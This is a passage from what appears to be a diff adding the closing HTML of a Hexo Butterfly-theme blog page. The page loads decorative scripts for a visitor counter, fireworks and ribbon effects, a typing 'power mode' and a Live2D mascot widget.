+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
